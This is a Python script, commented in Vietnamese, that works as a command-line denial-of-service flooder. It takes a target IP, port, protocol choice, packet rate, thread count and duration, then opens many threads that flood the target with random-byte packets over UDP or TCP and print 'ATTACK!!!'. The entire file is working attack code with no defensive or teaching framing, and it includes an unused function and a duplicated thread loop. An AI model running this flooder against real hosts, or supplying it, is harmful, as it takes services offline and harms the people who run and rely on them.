import random
import socket
import threading
import time
import sys

# Kiểm tra tham số đầu vào
if len(sys.argv) < 7:
    print(f"Usage: python3 {sys.argv[0]} <ip> <port> <udp(Y/N)> <packets_per_second> <threads> <time>")
    sys.exit(1)

# Lấy giá trị từ tham số dòng lệnh
ip = str(sys.argv[1])
port = int(sys.argv[2])
choice = str(sys.argv[3]).upper()  # Chuyển thành chữ hoa để dễ so sánh
times = int(sys.argv[4])
threads = int(sys.argv[5])
attack_time = int(sys.argv[6])  # Thời gian tấn công (giây)

# Lấy thời gian bắt đầu
start_time = time.time()

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while time.time() - start_time < attack_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(i + " ATTACK!!!")
        except:
            print("[!] ERROR!!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while time.time() - start_time < attack_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + " ATTACK!!!")
        except:
            s.close()
            print("[*] ERROR")

def run3():
    data = random._urandom(594)
    i = random.choice(("[*]", "[!]", "[#]"))
    while time.time() - start_time < attack_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + " ATTACK!!!")
        except:
            s.close()
            print("[*] ERROR")

# Tạo và chạy luồng
threads_list = []
for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target=run)
    else:
        th = threading.Thread(target=run2)
    th.start()
    threads_list.append(th)

# Thêm luồng lần nữa (theo code gốc)
for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target=run)
    else:
        th = threading.Thread(target=run2)
    th.start()
    threads_list.append(th)

# Chờ cho đến khi đủ thời gian tấn công
time.sleep(attack_time)

# Thoát chương trình
print("Attack finished!")
sys.exit(0)
